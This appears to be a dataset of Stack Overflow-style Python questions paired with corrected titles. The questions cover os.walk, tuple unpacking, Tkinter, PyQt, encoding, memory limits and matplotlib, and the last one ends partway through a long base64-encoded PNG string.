Help with my Python recursive folder read," I have a C++/Obj-C background and I am just discovering Python (been writing it for about an hour).I am writing a script to recursively read the contents of text files in a folder structure.The problem I have is the code I have written will only work for one folder deep. I can see why in the code (see #hardcoded path), I just don't know how I can move forward with Python since my experience with it is only brand new.Python Code: <code>  import osimport sysrootdir = sys.argv[1]for root, subFolders, files in os.walk(rootdir): for folder in subFolders: outfileName = rootdir + ""/"" + folder + ""/py-outfile.txt"" # hardcoded path folderOut = open( outfileName, 'w' ) print ""outfileName is "" + outfileName for file in files: filePath = rootdir + '/' + file f = open( filePath, 'r' ) toWrite = f.read() print ""Writing '"" + toWrite + ""' to"" + filePath folderOut.write( toWrite ) f.close() folderOut.close()",Python recursive folder read
python tuples into a method," This is ugly. What's a more Pythonic way to do it? <code>  import datetimet= (2010, 10, 2, 11, 4, 0, 2, 41, 0)dt = datetime.datetime(t[0], t[1], t[2], t[3], t[4], t[5], t[6])",What is the pythonic way to unpack tuples?
invoke a python method with parameters from a tuple," This is ugly. What's a more Pythonic way to do it? <code>  import datetimet= (2010, 10, 2, 11, 4, 0, 2, 41, 0)dt = datetime.datetime(t[0], t[1], t[2], t[3], t[4], t[5], t[6])",What is the pythonic way to unpack tuples?
RSS feed perser library in Python, I am looking for a good library in python that will help me parse RSS feeds. Has anyone used feedparser? Any feedback? <code> ,RSS feed parser library in Python
Python Text widget in Tkinter," How can I add the data from a text widget to another text widget? For example, I'm trying to insert the data in text1 to text, but it is not working. <code>  from Tkinter import *root = Tk()root.title(""Whois Tool"")text = Text()text1 = Text()text1.config(width=15, height=1)text1.pack()def button1(): text.insert(END, text1)b = Button(root, text=""Enter"", width=10, height=2, command=button1)b.pack()scrollbar = Scrollbar(root)scrollbar.pack(side=RIGHT, fill=Y)text.config(width=60, height=15)text.pack(side=LEFT, fill=Y)scrollbar.config(command=text.yview)text.config(yscrollcommand=scrollbar.set)root.mainloop()",How to copy data from one Tkinter Text widget to another?
PyQt MenuBar Mac 0SX Snow Leopard ," I am attempting to add an item to the application menu-bar of a simple PyQt example. However, the following code does not seem to alter the menu-bar at all. The only item in the menu is ""Python"". Below is the bulk of the code, minus imports and instantiation. I've also tried creating a new QMenuBar and using the setMenuBar() method to manually swap out the menu bar.Any glaring mistakes in the above snippet? <code>  class MainWindow(QtGui.QMainWindow): def __init__(self): QtGui.QMainWindow.__init__(self) self.resize(250, 150) self.setWindowTitle('menubar') self.modal = False exit = QtGui.QAction( QtGui.QIcon('images/app_icon.png'), 'Exit', self ) exit.setShortcut('Ctrl+Q') exit.setStatusTip('Exit application') self.connect(exit, QtCore.SIGNAL('triggered()'), QtCore.SLOT('close()')) menubar = self.menuBar() file = menubar.addMenu('File') file.addAction(exit)",PyQt MenuBar Mac OSX Snow Leopard
Changing default encoding of python ?," I have many ""can't encode"" and ""can't decode"" problems with Python when I run my applications from the console. But in the Eclipse PyDev IDE, the default character encoding is set to UTF-8, and I'm fine.I searched around for setting the default encoding, and people say that Python deletes the sys.setdefaultencoding function on startup, and we can not use it.So what's the best solution for it? <code> ",Changing default encoding of Python?
How to limit Python heap size?," I sometimes write Python programs which are very difficult to determine how much memory it will use before execution. As such, I sometimes invoke a Python program that tries to allocate massive amounts of RAM causing the kernel to heavily swap and degrade the performance of other running processes.Because of this, I wish to restrict how much memory a Python heap can grow. When the limit is reached, the program can simply crash. What's the best way to do this? If it matters, much code is written in Cython, so it should take into account memory allocated there. I am not married to a pure Python solution (it does not need to be portable), so anything that works on Linux is fine. <code> ",How to limit the heap size?
plottling lines without blocking executiong," I am using matplotlib to draw charts and graphs.When I plot the chart using the command show() my code blocks at this command.I would like to refresh my list of values with new data , and than refresh the image on the background. How to do that without closing each time the window with the graph?Below is the code I am using <code>  import pylaba = (1,2,3,4)pylab.plot(a)pylab.show() # blocks here",plotting lines without blocking execution
Python: Convert string in base64 to image and save on filesystem," I have a string in base64 format, which represents PNG image. Is there a way to save this image to the filesystem, as a PNG file?I encoded the image using flex. Actually this is what I get on server(can't see any image after any of proposed methods :( ) <code>  iVBORw0KGgoAAAANSUhEUgAABoIAAAaCCAYAAAABZu+EAAAqOElEQVR42uzBAQEAAACAkP6v7ggK\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACA2YMDAQAAAAAg\n/9dGUFVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV\nVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVWkPDgkA\nAAAABP1/7QobAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAA